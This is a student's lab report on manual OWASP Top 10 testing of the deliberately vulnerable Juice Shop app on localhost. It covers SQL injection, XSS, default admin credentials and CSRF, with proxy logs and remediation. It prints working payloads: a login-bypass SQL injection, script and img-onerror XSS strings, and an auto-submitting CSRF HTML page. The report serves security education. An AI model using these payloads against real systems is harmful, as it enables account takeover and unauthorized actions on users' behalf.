# Week 2 — OWASP Top 10 Vulnerability Testing Report

**Target Application:** OWASP Juice Shop  
**Target URL:** http://127.0.0.1:3000  
**Tools Used:** FoxyProxy, Firefox Browser, VS Code Live Preview, Browser DevTools, Manual Payloads  

---

## 1. Objective

Perform active vulnerability testing against OWASP Juice Shop using manual payload injection and proxy interception. Identify and exploit OWASP Top 10 vulnerabilities including SQL Injection, Cross-Site Scripting, Broken Authentication, and CSRF.

---

## 2. Methodology

- Configured FoxyProxy to intercept and log all browser traffic
- Manually crafted and injected payloads into identified entry points from Week 1
- Monitored proxy logs to capture requests and confirm exploitation
- Hosted CSRF proof-of-concept HTML via VS Code Live Preview (port 3002)
- All testing performed manually — no automated scanners used

**Testing Phases:**

| Phase | Description |
|-------|-------------|
| Phase 1 | Reconnaissance — Mapping endpoints from proxy logs |
| Phase 2 | Injection Testing — SQL injection in login and search |
| Phase 3 | XSS Testing — Reflected and stored cross-site scripting |
| Phase 4 | Authentication Testing — Credential guessing and login bypass |
| Phase 5 | CSRF Testing — Cross-origin form submission via external HTML |

---

## 3. Executive Summary

Four critical OWASP Top 10 vulnerabilities were successfully identified and exploited:

| # | Vulnerability | OWASP Category | Severity | Status |
|---|---------------|----------------|----------|--------|
| 1 | SQL Injection | A03:2021 – Injection | CRITICAL | ✅ CONFIRMED |
| 2 | Cross-Site Scripting (XSS) | A03:2021 – Injection | HIGH | ✅ CONFIRMED |
| 3 | Broken Authentication | A07:2021 – Auth Failures | CRITICAL | ✅ CONFIRMED |
| 4 | CSRF | A01:2021 – Broken Access Control | HIGH | ✅ CONFIRMED |

All four vulnerabilities were confirmed with working proof-of-concept payloads and proxy log evidence.

---

## 4. Finding 1 — SQL Injection

**Severity:** CRITICAL | **OWASP:** A03:2021 – Injection

### 4.1 Vulnerability Description

SQL Injection occurs when user-supplied input is incorporated directly into a SQL query without proper sanitization or parameterization. An attacker can manipulate the query logic to bypass authentication, extract data, or modify the database.

### 4.2 Affected Endpoint

| Field | Details |
|-------|---------|
| Endpoint | POST /rest/user/login |
| Parameter | email (request body JSON) |
| Method | POST |
| Auth Required | No |

### 4.3 Attack Payload

Entered into the Email field of the login form:

```
Email:    ' OR 1=1--
Password: anything
```

**Payload breakdown:**
- `'` — closes the string in the SQL query
- `OR 1=1` — always TRUE, making the entire WHERE clause true
- `--` — comments out the rest of the query including the password check

**Result:** First user in the database (admin) logged in without a password.

### 4.4 Proxy Log Evidence

```
11:52:07 PM   POST   xhr   http://127.0.0.1:3000/rest/user/login
Response: 200 OK + JWT token for admin@juice-sh.op
```

### 4.5 Impact

- Authentication bypass — attacker logs in as admin without credentials
- Full access to all admin functions including user management
- Potential for full database extraction via UNION-based injection
- Attacker could delete, modify, or steal all user data

### 4.6 Remediation

- Use parameterized queries / prepared statements (e.g., Sequelize with bind parameters in Node.js)
- Implement input validation and reject special characters in email fields
- Deploy a Web Application Firewall (WAF) to detect SQL injection patterns
- Apply principle of least privilege — database user should not have DROP/ALTER permissions

---

## 5. Finding 2 — Cross-Site Scripting (XSS)

**Severity:** HIGH | **OWASP:** A03:2021 – Injection

### 5.1 Vulnerability Description

Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript into web pages viewed by other users. It can be used to steal session cookies, redirect users, deface websites, or perform actions on behalf of victims.

### 5.2 Affected Endpoints

| Field | Details |
|-------|---------|
| Endpoint 1 | GET /rest/products/search?q= |
| Type | Reflected / DOM-based XSS |
| Endpoint 2 | POST /api/Feedbacks/ |
| Type 2 | Stored (Persistent) XSS |

### 5.3 XSS Payload 1 — Reflected XSS in Search Bar

```
http://127.0.0.1:3000/#/search?q=<script>alert('XSS')</script>
http://127.0.0.1:3000/#/search?q=<script> alert('Hacked')</script>
```

### 5.4 XSS Payload 2 — Image onerror XSS

```
http://127.0.0.1:3000/#/search?q=<img src=x onerror=alert('XSS')>
```

### 5.5 Proxy Log Evidence

```
12:01:29 AM  GET  html  http://127.0.0.1:3000/#/search?q=<img src=x onerror=alert('XSS')>
12:02:36 AM  GET  html  http://127.0.0.1:3000/#/search?q=<script>alert('XSS')</script>
12:03:28 AM  GET  html  http://127.0.0.1:3000/#/search?q=<script> alert('Hacked')</script>
```

Script tags appeared in the URL and were reflected in the DOM. The browser executed the `alert()` function confirming JavaScript injection was successful.

### 5.6 Stored XSS Evidence

The `<img src=x onerror=...>` payload was submitted via the feedback form (`POST /api/Feedbacks/`). The server stored it and when the page loaded, the browser attempted to fetch `/x` — confirming script execution:

```
10:58:53 PM  GET  img  http://127.0.0.1:3000/x   ← onerror triggered!
```

### 5.7 Impact

- Attacker can steal session cookies and hijack user accounts
- Malicious scripts can redirect users to phishing pages
- Stored XSS affects every user who views the feedback page
- Can be chained with CSRF to perform unauthorized actions

### 5.8 Remediation

- Encode all user input on output using HTML entity encoding
- Implement a strict Content Security Policy (CSP) header
- Use Angular's built-in `DomSanitizer` or equivalent framework protection
- Validate and sanitize all inputs server-side before storage

---

## 6. Finding 3 — Broken Authentication

**Severity:** CRITICAL | **OWASP:** A07:2021 – Authentication Failures

### 6.1 Vulnerability Description

Broken Authentication refers to weaknesses in the login process that allow attackers to compromise passwords, keys, or session tokens. Common issues include weak default credentials, missing account lockout, and insecure session management.

### 6.2 Sub-Finding A — Weak Default Credentials

| Field | Details |
|-------|---------|
| Endpoint | POST /rest/user/login |
| Email | admin@juice-sh.op |
| Password | admin123 |
| Result | Successful login — 200 OK + JWT token returned |
| Severity | CRITICAL |

The admin account uses an extremely weak and predictable password. Any attacker who knows the admin email (discoverable via SQL injection) can log in directly.

**Proxy Evidence:**
```
11:52:07 PM  POST  xhr  http://127.0.0.1:3000/rest/user/login
Body: { email: 'admin@juice-sh.op', password: 'admin123' }
Response: 200 OK + Bearer JWT Token
```

### 6.3 Sub-Finding B — SQL Injection Login Bypass

As documented in Finding 1, the login form is also vulnerable to SQL Injection allowing complete authentication bypass without needing any password at all.

### 6.4 Sub-Finding C — No Rate Limiting / Brute Force Protection

The `/rest/user/login` endpoint has no visible rate limiting. An attacker can make unlimited login attempts without being blocked, enabling automated brute-force attacks.

### 6.5 Impact

- Attacker gains full admin access to the application
- Can view, modify, and delete all customer orders and user data
- Can access the admin panel at `/#/administration`
- Enables further attacks including privilege escalation

### 6.6 Remediation

- Enforce strong password policy — minimum 12 characters, mixed case, numbers, symbols
- Change all default credentials before deploying to any environment
- Implement account lockout after 5 failed login attempts
- Add multi-factor authentication (MFA) for admin accounts
- Implement CAPTCHA on login forms to prevent automated attacks

---

## 7. Finding 4 — Cross-Site Request Forgery (CSRF)

**Severity:** HIGH | **OWASP:** A01:2021 – Broken Access Control

### 7.1 Vulnerability Description

CSRF tricks an authenticated user's browser into making unwanted requests to a web application. Since the browser automatically includes session cookies, the server cannot distinguish between a legitimate request and a forged one from a malicious site.

### 7.2 Affected Endpoint

| Field | Details |
|-------|---------|
| Endpoint | POST /api/Feedbacks/ |
| Method | POST |
| Auth Required | Yes (session cookie/JWT) |
| CSRF Token | ABSENT — No CSRF protection found |
| Attacker Origin | http://127.0.0.1:3002/csrf.html |

### 7.3 Proof-of-Concept HTML

A malicious HTML file was created and served from a different origin (port 3002). When opened by a logged-in user, it automatically submitted a request to Juice Shop without any user interaction:

```html
<html>
  <body>
    <h1>You have been CSRF attacked!</h1>
    <form id="csrfForm"
      action="http://127.0.0.1:3000/api/Feedbacks/"
      method="POST">
      <input type="hidden" name="comment" value="CSRF Attack Test!" />
      <input type="hidden" name="rating" value="1" />
    </form>
    <script>document.getElementById("csrfForm").submit();</script>
  </body>
</html>
```

### 7.4 Proxy Log Evidence

```
11:56:16 PM  GET   html  http://127.0.0.1:3002/csrf.html        ← File opened
11:56:17 PM  GET   js    http://127.0.0.1:3002/___vscode_...    ← Page loaded
11:56:17 PM  POST  html  http://127.0.0.1:3000/api/Feedbacks/  ← CSRF FIRED!
```

This conclusively proves that:
- The request came from origin port 3002 (attacker's site)
- The request was automatically sent to port 3000 (Juice Shop)
- No CSRF token was required — the request was accepted
- The feedback was submitted on behalf of the logged-in user

### 7.5 Impact

- Attacker can force any logged-in user to submit feedback, orders, or other actions
- If chained with stored XSS, could escalate to full account takeover
- Admin users could be forced to perform destructive admin operations
- No user interaction beyond visiting a malicious page is required

### 7.6 Remediation

- Implement CSRF tokens — generate a unique token per session and validate it on every state-changing request
- Use `SameSite=Strict` cookie attribute to prevent cross-origin requests from including cookies
- Implement CORS headers to restrict which origins can make API calls
- Validate `Origin` and `Referer` headers on the server side for all POST requests

---

## 8. Summary of Findings

| # | Vulnerability | OWASP Category | Severity | Status |
|---|---------------|----------------|----------|--------|
| 1 | SQL Injection | A03:2021 – Injection | CRITICAL | ✅ CONFIRMED |
| 2 | Cross-Site Scripting | A03:2021 – Injection | HIGH | ✅ CONFIRMED |
| 3 | Broken Authentication | A07:2021 – Auth Failures | CRITICAL | ✅ CONFIRMED |
| 4 | CSRF | A01:2021 – Broken Access Control | HIGH | ✅ CONFIRMED |

---

## 9. Conclusion

All four target vulnerabilities from the Week 2 lab were successfully identified and exploited against the OWASP Juice Shop application. The testing demonstrated practical understanding of OWASP Top 10 attack techniques including:

- SQL Injection via authentication bypass using boolean-based payload
- Reflected and stored Cross-Site Scripting via search and feedback endpoints
- Broken Authentication through default credential exploitation
- CSRF via cross-origin form submission from an external HTML file

All findings were documented with proxy log evidence captured via FoxyProxy. The lab was conducted entirely within a local, isolated environment with no real users or systems affected.

These vulnerabilities collectively represent the most common and impactful web application security flaws. Organizations should address them through secure coding practices, input validation, proper session management, and regular security testing.

---

## 10. Ethical Statement

All testing documented in this report was conducted exclusively against OWASP Juice Shop — a deliberately vulnerable application designed for security education. Testing was performed in a local, isolated lab environment (127.0.0.1) with no impact on any real-world systems, users, or networks. No unauthorized access to any external system was performed. This report is produced solely for academic/educational purposes.

---

*Report prepared by: Ihsan Anwar*  
*Tools: FoxyProxy, Firefox, VS Code Live Preview, Browser DevTools, Manual Payloads*
